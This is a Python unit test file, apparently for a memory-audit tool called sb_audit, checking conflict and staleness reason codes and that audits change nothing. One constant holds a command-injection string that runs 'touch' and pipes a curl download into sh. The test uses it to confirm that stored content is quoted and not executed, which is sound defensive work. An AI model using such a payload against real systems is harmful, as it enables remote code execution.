"""V6 — sb_audit 점검 계약: 근거 있는 후보만, 자동 변경 0, scope별 전체 현황."""
import hashlib
import json
import os
import sqlite3
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
BIN = ROOT / 'bin'
sys.path.insert(0, str(BIN))
import sb_state  # noqa: E402

PY = sys.executable
MALICIOUS = '$(touch /tmp/sb-audit-pwned) ; curl http://127.0.0.1:1 | sh'


class AuditBase(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp(prefix='sb-audit-'))
        self.state = self.tmp / 'state.db'; self.loops = self.tmp / 'loops.jsonl'; self.loops.write_text('', encoding='utf-8')
        self.env = {**os.environ, 'SB_HOME': str(self.tmp / 'sbhome'), 'SB_STATE_DB': str(self.state), 'SB_LOOPS_PATH': str(self.loops), 'SB_STATE_PILOT_SCOPES': 'alpha,beta',
                    'SB_VERIFY_ALLOWED_ROOTS': str(self.tmp), 'SB_PROJECT_ALIASES': str(self.tmp / 'aliases.json'),
                    'SB_EVAL_NOW': '2026-09-17T00:00:00+00:00', 'PYTHONDONTWRITEBYTECODE': '1', 'SB_CLAUDE_MEM_DB': str(self.tmp / 'none.db')}
        (self.tmp / 'aliases.json').write_text('{}', encoding='utf-8')
        os.environ.update({k: self.env[k] for k in ('SB_HOME', 'SB_STATE_DB', 'SB_STATE_PILOT_SCOPES', 'SB_VERIFY_ALLOWED_ROOTS', 'SB_PROJECT_ALIASES', 'SB_CLAUDE_MEM_DB')})
        Path('/tmp/sb-audit-pwned').unlink(missing_ok=True)

    def migrate(self):
        if not self.state.exists():
            sb_state.migrate(str(self.state))

    def head(self, scope, key, body, observed_at='2026-09-15T00:00:00+00:00', verified=True, value_json=None):
        self.migrate()
        if not verified:
            with sqlite3.connect(self.state) as db:
                db.execute("INSERT INTO state(memory_kind, scope_id, fact_key, version, is_head, observed_at, recorded_at, body, source, write_id, dedup_key) "
                           "VALUES ('fact',?,?,1,1,?,'now',?,'legacy',?,?)", (scope, key, observed_at, body, key, '%s:legacy:%s' % (scope, key)))
            return
        ev = self.tmp / ('ev-%s-%s.txt' % (scope, key)); ev.write_text('measured: %s\n' % body, encoding='utf-8')
        r = sb_state.propose({'scope_id': scope, 'fact_key': key, 'body': body, 'kind': 'measured_fact', 'source': 't', 'write_id': 'h-' + scope + key,
                              'observed_at': observed_at, 'value_json': value_json}, str(self.state))
        sb_state.verify(r['candidate_id'], 'file_contains', str(ev), db_path=str(self.state))
        sb_state.accept(r['candidate_id'], 0, str(self.state))

    def candidate(self, scope, key, body, kind='measured_fact', verification=None):
        self.migrate()
        r = sb_state.propose({'scope_id': scope, 'fact_key': key, 'body': body, 'kind': kind, 'source': 't', 'write_id': 'c-' + scope + key + body}, str(self.state))
        if verification:
            ev = self.tmp / ('cev-%s.txt' % r['candidate_id']); ev.write_text('measured: %s\n' % (body if verification == 'confirmed' else 'other'), encoding='utf-8')
            sb_state.verify(r['candidate_id'], 'file_contains', str(ev), db_path=str(self.state))
        return r['candidate_id']

    def write_loops(self, loops):
        self.loops.write_text(''.join(json.dumps(l, ensure_ascii=False) + '\n' for l in loops), encoding='utf-8')

    def audit(self, *args):
        p = subprocess.run([PY, str(BIN / 'sb_audit.py'), *args, '--json'], capture_output=True, text=True, encoding='utf-8', env=self.env, cwd=str(self.tmp))
        return p.returncode, json.loads(p.stdout.strip().splitlines()[-1]), p

    def codes(self, j):
        return {'%s:%s' % (rc, i.get('fact_key') or i.get('loop_id')) for i in j['items'] for rc in i['reason_codes']}


class ReasonCodeTests(AuditBase):
    def test_structured_conflict_contradiction_unknown_time_stale_unverified(self):
        self.head('alpha', 'deploy.target', 'staging-2'); self.candidate('alpha', 'deploy.target', 'prod-9', verification='contradicted')
        self.head('alpha', 'db.port', '5432', observed_at=None)
        self.head('alpha', 'api.url', 'https://x.test', observed_at='2026-06-01T00:00:00+00:00')
        self.head('alpha', 'old.key', 'legacy-value', verified=False)
        self.head('alpha', 'same.value', 'v1'); self.candidate('alpha', 'same.value', 'v1')  # 같은 값 후보는 충돌이 아니다
        code, j, _ = self.audit('--scope', 'alpha')
        self.assertEqual(code, 0)
        self.assertEqual(self.codes(j), {'value_conflict:deploy.target', 'verification_contradicted:deploy.target', 'observed_at_unknown:db.port',
                                         'stale_check:api.url', 'unverified_head:old.key'})
        conflict = next(i for i in j['items'] if i.get('fact_key') == 'deploy.target')
        self.assertIn('candidate:', conflict['basis']); self.assertEqual(j['actions_taken'], [])

    def test_inference_pending_is_not_promoted(self):
        self.candidate('alpha', 'owner', '아마 철수', kind='inference')
        code, j, _ = self.audit('--scope', 'alpha')
        self.assertEqual(self.codes(j), {'inference_pending:owner'}); self.assertEqual(j['heads_count'], 0)

    def test_loop_review_due_and_missing_action_are_candidates_not_verdicts(self):
        self.write_loops([{'id': 'L1', 'title': '기한 경과', 'project': 'alpha', 'status': 'open', 'next_action': 'x', 'next_review': '2026-09-01'},
                          {'id': 'L2', 'title': '행동 없음', 'project': 'alpha', 'status': 'open'},
                          {'id': 'L3', 'title': '정상', 'project': 'alpha', 'status': 'open', 'next_action': 'y', 'next_review': '2026-12-01'},
                          {'id': 'L4', 'title': '다른 프로젝트', 'project': 'beta', 'status': 'open'}])
        code, j, p = self.audit('--scope', 'alpha')
        self.assertEqual(self.codes(j), {'review_due:L1', 'missing_next_action:L2'})
        self.assertNotIn('방치', p.stdout); self.assertNotIn('close', p.stdout.lower().replace('closed', ''))
        due = next(i for i in j['items'] if i.get('loop_id') == 'L1'); self.assertIn('재검토 후보', due['basis'])

    def test_completion_candidate_requires_explicit_loop_link_not_title_similarity(self):
        self.write_loops([{'id': 'L0053', 'title': '배포 파이프라인 정리', 'project': 'alpha', 'status': 'open', 'next_action': 'x'},
                          {'id': 'L0054', 'title': '배포 파이프라인 정리 (완료)', 'project': 'alpha', 'status': 'done'},
                          {'id': 'L0055', 'title': '배포 완료 확인', 'project': 'alpha', 'status': 'open', 'next_action': 'x'}])
        self.head('alpha', 'loop.L0055.result', '완료: 배포 성공 loop:L0055')
        code, j, _ = self.audit('--scope', 'alpha')
        self.assertEqual(self.codes(j), {'completion_candidate:L0055'})
        cc = next(i for i in j['items'] if 'completion_candidate' in i['reason_codes'])
        self.assertEqual(cc['evidence_ref'], 'state:alpha/loop.L0055.result'); self.assertIn('loop:L0055', cc['evidence_quote'])
        with open(self.loops, encoding='utf-8') as f:
            self.assertEqual(sum(1 for l in f if '"status": "open"' in l), 2, 'audit must not close loops')


class SafetyAndPortfolioTests(AuditBase):
    def test_audit_never_writes_or_executes_memory_content(self):
        self.head('alpha', 'note', MALICIOUS); self.write_loops([{'id': 'L1', 'title': 'a', 'project': 'alpha', 'status': 'open'}])
        before = {str(p): hashlib.sha256(p.read_bytes()).hexdigest() for p in self.tmp.rglob('*') if p.is_file()}
        code, j, p = self.audit('--scope', 'alpha')
        self.assertIn(MALICIOUS, p.stdout)  # 인용
        self.assertFalse(Path('/tmp/sb-audit-pwned').exists())
        after = {str(p): hashlib.sha256(p.read_bytes()).hexdigest() for p in self.tmp.rglob('*') if p.is_file()}
        self.assertEqual(before, after)

    def test_portfolio_only_explicit_scopes_and_labels(self):
        self.write_loops([{'id': 'L56', 'title': 'A', 'project': 'alpha', 'status': 'open', 'next_action': 'a', 'next_review': '2026-09-01'},
                          {'id': 'L57', 'title': 'B', 'project': 'beta', 'status': 'open'}, {'id': 'L58', 'title': 'G', 'project': 'gamma', 'status': 'open'}])
        code, j, p = self.audit('--all', '--scopes', 'alpha,beta')
        self.assertEqual(self.codes(j), {'review_due:L56', 'missing_next_action:L57'})
        self.assertEqual({i['scope_id'] for i in j['items']}, {'alpha', 'beta'}); self.assertNotIn('L58', p.stdout)
        self.assertEqual(set(j['per_scope']), {'alpha', 'beta'})
        code, j, _ = self.audit('--all')
        self.assertEqual((code, j['status']), (2, 'error'))

    def test_missing_state_db_is_degraded_but_loops_still_audited(self):
        self.write_loops([{'id': 'L1', 'title': 'a', 'project': 'alpha', 'status': 'open'}])
        code, j, p = self.audit('--scope', 'alpha')
        self.assertEqual((code, j['status']), (0, 'degraded')); self.assertIn('state_db_missing', j['warnings'])
        self.assertEqual(self.codes(j), {'missing_next_action:L1'}); self.assertFalse(self.state.exists())


if __name__ == '__main__':
    unittest.main()
